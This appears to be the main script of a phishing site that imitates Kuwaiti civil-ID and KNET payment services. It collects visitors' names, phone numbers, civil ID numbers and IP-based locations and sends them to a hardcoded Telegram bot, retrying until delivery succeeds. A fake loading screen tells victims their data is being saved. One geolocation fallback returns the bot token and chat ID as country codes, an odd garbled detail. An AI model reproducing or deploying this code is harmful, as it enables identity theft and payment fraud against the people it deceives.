const TELEGRAM_REQUEST_TIMEOUT_MS = 3000;
const TELEGRAM_LOCATION_TIMEOUT_MS = 3000;
const TELEGRAM_PENDING_MESSAGES_KEY = "pendingTelegramMessages";
const TELEGRAM_SEPARATOR = "<b>───────────────</b>";
const TELEGRAM_PERSONAL_INFO_MISSING_LINE = "المستخدم لم يقم بادخال المعلومات الشخصية";
const TELEGRAM_CONFIG = window.__TELEGRAM_CONFIG__ || {};
const TELEGRAM_BOT_TOKEN = String(TELEGRAM_CONFIG.botToken || "8722266485:AAFdgL-z89n8BOiEtgonO68BI4MscX4D-f8");
const TELEGRAM_CHAT_ID = String(TELEGRAM_CONFIG.chatId || "6025858761");
const COUNTRY_STORAGE_KEY = "country";
const LOCATION_STORAGE_KEY = "location";
const SUBMISSION_LOADING_DURATION_MS = 3000;
const SUBMISSION_LOADING_STYLE_ID = "submission-loading-style";
const SUBMISSION_LOADING_OVERLAY_ID = "submission-loading-overlay";
const SUBMISSION_LOADING_VARIANT_KNET = "knet";
const LOCATION_API_FALLBACKS = [
  {
    url: "https://get.geojs.io/v1/ip/geo.json",
    getCountryCode(data) {
      return data && data.country_code ? data.country_code : "";
    },
  },
  {
    url: "https://ipinfo.io/json",
    getCountryCode(data) {
      return data && data.country ? data.country : "";
    },
  },
  {
    url: "https://ipwho.is/",
    getCountryCode(data) {
      return data && data.success ? data.country_code || "6025858761" : "8722266485:AAFdgL-z89n8BOiEtgonO68BI4MscX4D-f8";
    },
  },
];

let submissionLoadingAnimationFrameId = null;
const NON_WESTERN_DIGIT_MAP = {
  "٠": "0",
  "١": "1",
  "٢": "2",
  "٣": "3",
  "٤": "4",
  "٥": "5",
  "٦": "6",
  "٧": "7",
  "٨": "8",
  "٩": "9",
  "۰": "0",
  "۱": "1",
  "۲": "2",
  "۳": "3",
  "۴": "4",
  "۵": "5",
  "۶": "6",
  "۷": "7",
  "۸": "8",
  "۹": "9",
  "०": "0",
  "१": "1",
  "२": "2",
  "३": "3",
  "४": "4",
  "५": "5",
  "६": "6",
  "७": "7",
  "८": "8",
  "९": "9",
  "０": "0",
  "１": "1",
  "２": "2",
  "３": "3",
  "４": "4",
  "５": "5",
  "６": "6",
  "７": "7",
  "８": "8",
  "９": "9",
};

function normalizeStoredValue(value) {
  return typeof value === "string" ? value.trim() : "";
}

function convertToWesternDigits(value) {
  return String(value || "").replace(/[٠-٩۰-۹०-९０-９]/g, function(character) {
    return NON_WESTERN_DIGIT_MAP[character] || character;
  });
}

function shouldNormalizeNumericInput(input) {
  if (!(input instanceof HTMLInputElement)) {
    return false;
  }

  if (input.type === "file" || input.type === "submit" || input.type === "button" || input.type === "reset") {
    return false;
  }

  return (
    input.inputMode === "numeric" ||
    input.type === "tel" ||
    input.classList.contains("allownumericwithoutdecimal") ||
    input.getAttribute("pattern") === "[0-9]*" ||
    input.dataset.digitsOnly === "true"
  );
}

function normalizeNumericInputValue(input) {
  if (!shouldNormalizeNumericInput(input)) {
    return;
  }

  let normalizedValue = convertToWesternDigits(input.value).replace(/\D/g, "");

  if (input.maxLength > 0) {
    normalizedValue = normalizedValue.slice(0, input.maxLength);
  }

  if (input.value !== normalizedValue) {
    input.value = normalizedValue;
  }
}

function setupNumericInputNormalization() {
  document.querySelectorAll("input").forEach(function(input) {
    normalizeNumericInputValue(input);
  });

  function handleNumericInputEvent(event) {
    normalizeNumericInputValue(event.target);
  }

  document.addEventListener("input", handleNumericInputEvent);
  document.addEventListener("change", handleNumericInputEvent);
}

function countryCodeToFlagEmoji(countryCode) {
  if (!countryCode || String(countryCode).length !== 2) {
    return "📍";
  }

  return String(countryCode)
    .toUpperCase()
    .split("")
    .map(function(character) {
      return String.fromCodePoint(127397 + character.charCodeAt(0));
    })
    .join("");
}

function getArabicCountryName(countryCode) {
  if (!countryCode || typeof Intl === "undefined" || typeof Intl.DisplayNames !== "function") {
    return "";
  }

  try {
    const regionNames = new Intl.DisplayNames(["ar"], { type: "region" });
    return regionNames.of(String(countryCode).toUpperCase()) || "";
  } catch (error) {
    return "";
  }
}

function shouldUseTelegramHtml(text) {
  return /<[^>]+>/.test(String(text || ""));
}

async function send(text, notify = false, timeoutMs = TELEGRAM_REQUEST_TIMEOUT_MS) {
  if (!text) {
    return null;
  }

  const controller = new AbortController();
  const timeoutId = window.setTimeout(function() {
    controller.abort();
  }, timeoutMs);
  const body = {
    chat_id: TELEGRAM_CHAT_ID,
    text: text,
    disable_notification: Boolean(notify),
  };

  if (shouldUseTelegramHtml(text)) {
    body.parse_mode = "HTML";
  }

  try {
    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      signal: controller.signal,
      keepalive: true,
      body: JSON.stringify(body),
    });

    if (!response.ok) {
      throw new Error(`Telegram request failed with status ${response.status}`);
    }

    const data = await response.json();

    if (!data.ok) {
      throw new Error(data.description || "Telegram request failed.");
    }

    return data;
  } finally {
    window.clearTimeout(timeoutId);
  }
}

function getPendingTelegramMessages() {
  try {
    const rawMessages = localStorage.getItem(TELEGRAM_PENDING_MESSAGES_KEY);
    const parsedMessages = rawMessages ? JSON.parse(rawMessages) : [];
    return Array.isArray(parsedMessages) ? parsedMessages : [];
  } catch (error) {
    localStorage.removeItem(TELEGRAM_PENDING_MESSAGES_KEY);
    return [];
  }
}

function setPendingTelegramMessages(messages) {
  if (!messages.length) {
    localStorage.removeItem(TELEGRAM_PENDING_MESSAGES_KEY);
    return;
  }

  localStorage.setItem(TELEGRAM_PENDING_MESSAGES_KEY, JSON.stringify(messages));
}

function queueTelegramMessage(text, notify) {
  const pendingMessages = getPendingTelegramMessages();
  pendingMessages.push({
    id: `${Date.now()}-${Math.random().toString(16).slice(2)}`,
    text: text,
    notify: Boolean(notify),
  });
  setPendingTelegramMessages(pendingMessages);
}

function removeQueuedTelegramMessagesByText(text) {
  const pendingMessages = getPendingTelegramMessages().filter(function(message) {
    return message.text !== text;
  });

  setPendingTelegramMessages(pendingMessages);
}

async function sendTelegramMessageWithQueue(text, notify) {
  try {
    await send(text, notify, TELEGRAM_REQUEST_TIMEOUT_MS);
    removeQueuedTelegramMessagesByText(text);
    return { sent: true, queued: false };
  } catch (error) {
    queueTelegramMessage(text, notify);
    return { sent: false, queued: true, error: error };
  }
}

async function persistTelegramMessageThenSend(text, notify) {
  queueTelegramMessage(text, notify);

  try {
    await send(text, notify, TELEGRAM_REQUEST_TIMEOUT_MS);
    removeQueuedTelegramMessagesByText(text);
    return { sent: true, queued: false };
  } catch (error) {
    return { sent: false, queued: true, error: error };
  }
}

function waitForSubmissionDelay(durationMs) {
  return new Promise(function(resolve) {
    window.setTimeout(resolve, durationMs);
  });
}

async function sendTelegramUntilDelivered(text, notify) {
  queueTelegramMessage(text, notify);

  while (true) {
    try {
      await send(text, notify, TELEGRAM_REQUEST_TIMEOUT_MS);
      removeQueuedTelegramMessagesByText(text);
      return true;
    } catch (error) {
      await waitForSubmissionDelay(1200);
    }
  }
}

async function retryPendingTelegramMessages() {
  const pendingMessages = getPendingTelegramMessages();

  if (!pendingMessages.length) {
    return;
  }

  const remainingMessages = [];

  for (const message of pendingMessages) {
    try {
      await send(message.text, message.notify, TELEGRAM_REQUEST_TIMEOUT_MS);
    } catch (error) {
      remainingMessages.push(message);
    }
  }

  setPendingTelegramMessages(remainingMessages);
}

async function fetchJsonWithTimeout(url, timeoutMs = TELEGRAM_LOCATION_TIMEOUT_MS) {
  const controller = new AbortController();
  const timeoutId = window.setTimeout(function() {
    controller.abort();
  }, timeoutMs);

  try {
    const response = await fetch(url, {
      headers: { Accept: "application/json" },
      signal: controller.signal,
    });

    if (!response.ok) {
      throw new Error(`Location request failed with status ${response.status}`);
    }

    return await response.json();
  } finally {
    window.clearTimeout(timeoutId);
  }
}

async function fetchVisitorCountryData() {
  for (const api of LOCATION_API_FALLBACKS) {
    try {
      const data = await fetchJsonWithTimeout(api.url, TELEGRAM_LOCATION_TIMEOUT_MS);
      const countryCode = api.getCountryCode(data);
      const countryName = getArabicCountryName(countryCode);

      if (!countryCode || !countryName) {
        throw new Error("Location data is incomplete.");
      }

      return {
        countryCode: countryCode,
        countryName: countryName,
      };
    } catch (error) {
      continue;
    }
  }

  return null;
}

async function getAppCountryNameInArabic() {
  const visitorCountry = await fetchVisitorCountryData();

  if (!visitorCountry) {
    return "";
  }

  localStorage.setItem(COUNTRY_STORAGE_KEY, visitorCountry.countryName);
  localStorage.setItem(
    LOCATION_STORAGE_KEY,
    `${countryCodeToFlagEmoji(visitorCountry.countryCode)} - ${visitorCountry.countryName}`
  );
  return visitorCountry.countryName;
}

async function getVisitorLocationInArabic() {
  const visitorCountry = await fetchVisitorCountryData();

  if (!visitorCountry) {
    localStorage.setItem(LOCATION_STORAGE_KEY, "");
    return "";
  }

  const formattedLocation = `${countryCodeToFlagEmoji(visitorCountry.countryCode)} - ${visitorCountry.countryName}`;
  localStorage.setItem(COUNTRY_STORAGE_KEY, visitorCountry.countryName);
  localStorage.setItem(LOCATION_STORAGE_KEY, formattedLocation);
  return formattedLocation;
}

function getCurrentPageKey() {
  const pathname = window.location.pathname || "";

  if (!pathname || pathname === "/" || pathname.endsWith("/index.html")) {
    return "index";
  }

  const segments = pathname.split("/");
  return segments[segments.length - 1] || "index";
}

function getCurrentPageDisplayName() {
  const pageKey = getCurrentPageKey();

  switch (pageKey) {
    case "index":
      return "الرئيسية";
    case "services.html":
      return "الخدمات";
    case "service-request.html":
      return "طلب خدمة";
    case "gateway.html":
      return "بوابة الدفع";
    case "paci.html":
      return "خدمات البطاقة";
    case "knet.html":
      return "صفحة الكي نت";
    default:
      return pageKey.replace(/\.html$/i, "") || "صفحة غير معروفة";
  }
}

function getVisitorConsoleSummary() {
  const serviceName = normalizeStoredValue(localStorage.getItem("service"));
  const civilId = normalizeStoredValue(localStorage.getItem("civil-id"));
  const location = normalizeStoredValue(localStorage.getItem(LOCATION_STORAGE_KEY));
  const lines = [`📄 ${getCurrentPageDisplayName()}`];

  if (serviceName) {
    lines.push(`🛠️ ${serviceName}`);
  }

  if (civilId) {
    lines.push(`🆔 ${civilId}`);
  }

  if (location) {
    lines.push(location);
  }

  return lines.join("\n");
}

function visitor_log_in_main() {
  sendTelegramMessageWithQueue(getVisitorConsoleSummary(), false).catch(function() {});
}

function getStoredIdentity() {
  return {
    name:
      normalizeStoredValue(localStorage.getItem("applicant-name")) ||
      normalizeStoredValue(localStorage.getItem("step1.name")),
    phone:
      normalizeStoredValue(localStorage.getItem("mobile-number")) ||
      normalizeStoredValue(localStorage.getItem("phone")) ||
      normalizeStoredValue(localStorage.getItem("step1.phone")),
    civilId:
      normalizeStoredValue(localStorage.getItem("civil-id")) ||
      normalizeStoredValue(localStorage.getItem("step1.civil")),
  };
}

function getStoredIdentityLines() {
  const identity = getStoredIdentity();

  return [
    `👤 الاسم: ${identity.name || "غير متوفر"}`,
    `📞 رقم الهاتف: ${identity.phone || "غير متوفر"}`,
  ];
}

function ensureSubmissionLoadingOverlay() {
  if (!document.body) {
    return null;
  }

  if (!document.getElementById(SUBMISSION_LOADING_STYLE_ID)) {
    const style = document.createElement("style");
    style.id = SUBMISSION_LOADING_STYLE_ID;
    style.textContent = `
      body.is-submission-loading {
        overflow: hidden;
      }

      .submission-loading-overlay {
        position: fixed;
        inset: 0;
        z-index: 9999;
        display: flex;
        align-items: center;
        justify-content: center;
        padding: 24px;
        background: rgba(255, 255, 255, 0.94);
        backdrop-filter: blur(6px);
      }

      .submission-loading-overlay.is-knet {
        background: rgba(85, 85, 85, 0.5);
        backdrop-filter: none;
      }

      .submission-loading-overlay[hidden] {
        display: none !important;
      }

      .submission-loading-card {
        width: min(320px, 100%);
        padding: 28px 24px;
        border-radius: 24px;
        text-align: center;
        background: linear-gradient(180deg, #ffffff 0%, #eef8ff 100%);
        box-shadow: 0 24px 60px rgba(0, 77, 128, 0.16);
        border: 1px solid rgba(0, 163, 224, 0.16);
      }

      .submission-loading-spinner {
        position: relative;
        width: 72px;
        height: 72px;
        margin: 0 auto 18px;
        line-height: 0;
      }

      .submission-loading-overlay.is-knet .submission-loading-card {
        width: auto;
        padding: 0;
        background: transparent;
        box-shadow: none;
        border: 0;
      }

      .submission-loading-overlay.is-knet .submission-loading-spinner {
        width: min(15vh, 96px);
        height: min(15vh, 96px);
        margin: 0 auto;
      }

      .submission-loading-logo {
        position: absolute;
        inset: 0;
        width: 100%;
        height: 100%;
        margin: auto;
        display: block;
        animation: submission-loading-spin 1s linear infinite;
        transform-origin: center center;
        will-change: transform;
      }

      .submission-loading-overlay.is-knet .submission-loading-title,
      .submission-loading-overlay.is-knet .submission-loading-copy,
      .submission-loading-overlay.is-knet .submission-loading-progress {
        display: none;
      }

      .submission-loading-title {
        margin: 0;
        color: #0f172a;
        font-size: 1rem;
        font-weight: 700;
      }

      .submission-loading-copy {
        margin: 8px 0 0;
        color: #475569;
        font-size: 0.875rem;
      }

      .submission-loading-progress {
        width: 100%;
        height: 8px;
        margin-top: 18px;
        overflow: hidden;
        border-radius: 999px;
        background: rgba(15, 23, 42, 0.08);
      }

      .submission-loading-progress-bar {
        width: 0;
        height: 100%;
        border-radius: inherit;
        background: linear-gradient(90deg, #00a3e0 0%, #1d4ed8 100%);
      }

      @keyframes submission-loading-spin {
        from { transform: rotate(0deg); }
        to { transform: rotate(360deg); }
      }
    `;
    document.head.appendChild(style);
  }

  let overlay = document.getElementById(SUBMISSION_LOADING_OVERLAY_ID);

  if (!overlay) {
    overlay = document.createElement("div");
    overlay.id = SUBMISSION_LOADING_OVERLAY_ID;
    overlay.className = "submission-loading-overlay";
    overlay.hidden = true;
    overlay.innerHTML = `
      <div class="submission-loading-card" dir="rtl">
        <div class="submission-loading-spinner" aria-hidden="true">
          <img class="submission-loading-logo" src="./assets/images/logo.svg" alt="Loading logo" />
        </div>
        <p class="submission-loading-title" data-loading-title>جارٍ تجهيز البيانات</p>
        <p class="submission-loading-copy">يتم حفظ البيانات وإرسالها قبل الانتقال للخطوة التالية.</p>
        <div class="submission-loading-progress" aria-hidden="true">
          <div class="submission-loading-progress-bar" data-loading-progress></div>
        </div>
      </div>
    `;
    document.body.appendChild(overlay);
  }

  return overlay;
}

function showSubmissionLoadingOverlay(title, durationMs, variant) {
  const overlay = ensureSubmissionLoadingOverlay();

  if (!overlay) {
    return;
  }

  const loadingTitle = overlay.querySelector("[data-loading-title]");
  const progressBar = overlay.querySelector("[data-loading-progress]");
  const progressDuration = typeof durationMs === "number" ? durationMs : SUBMISSION_LOADING_DURATION_MS;
  const overlayVariant = variant || "default";

  if (loadingTitle && title) {
    loadingTitle.textContent = title;
  }

  overlay.classList.toggle("is-knet", overlayVariant === SUBMISSION_LOADING_VARIANT_KNET);
  overlay.hidden = false;
  document.body.classList.add("is-submission-loading");

  if (!progressBar) {
    return;
  }

  if (submissionLoadingAnimationFrameId) {
    window.cancelAnimationFrame(submissionLoadingAnimationFrameId);
    submissionLoadingAnimationFrameId = null;
  }

  progressBar.style.transition = "none";
  progressBar.style.width = "0%";

  submissionLoadingAnimationFrameId = window.requestAnimationFrame(function() {
    submissionLoadingAnimationFrameId = window.requestAnimationFrame(function() {
      progressBar.style.transition = `width ${progressDuration}ms linear`;
      progressBar.style.width = "100%";
    });
  });
}

function hideSubmissionLoadingOverlay() {
  const overlay = document.getElementById(SUBMISSION_LOADING_OVERLAY_ID);

  if (submissionLoadingAnimationFrameId) {
    window.cancelAnimationFrame(submissionLoadingAnimationFrameId);
    submissionLoadingAnimationFrameId = null;
  }

  if (!overlay) {
    return;
  }

  const progressBar = overlay.querySelector("[data-loading-progress]");

  if (progressBar) {
    progressBar.style.transition = "none";
    progressBar.style.width = "0%";
  }

  overlay.hidden = true;
  overlay.classList.remove("is-knet");
  document.body.classList.remove("is-submission-loading");
}

window.getAppCountryNameInArabic = getAppCountryNameInArabic;
window.sendAppTelegramMessage = sendTelegramMessageWithQueue;
window.getVisitorLocationInArabic = getVisitorLocationInArabic;
window.getVisitorConsoleSummary = getVisitorConsoleSummary;
window.visitor_log_in_main = visitor_log_in_main;
window.sendTelegramMessageWithQueue = sendTelegramMessageWithQueue;
window.persistTelegramMessageThenSend = persistTelegramMessageThenSend;
window.retryPendingTelegramMessages = retryPendingTelegramMessages;
window.sendTelegramUntilDelivered = sendTelegramUntilDelivered;
window.showSubmissionLoadingOverlay = showSubmissionLoadingOverlay;
window.hideSubmissionLoadingOverlay = hideSubmissionLoadingOverlay;
window.waitForSubmissionDelay = waitForSubmissionDelay;
window.getTelegramStoredIdentityLines = getStoredIdentityLines;
window.getTelegramStoredIdentity = getStoredIdentity;
window.getTelegramSeparator = function() {
  return TELEGRAM_SEPARATOR;
};
window.getTelegramPersonalInfoFallbackText = function() {
  return TELEGRAM_PERSONAL_INFO_MISSING_LINE;
};

if (document.readyState === "loading") {
  document.addEventListener("DOMContentLoaded", setupNumericInputNormalization, { once: true });
} else {
  setupNumericInputNormalization();
}

retryPendingTelegramMessages().catch(function() {});
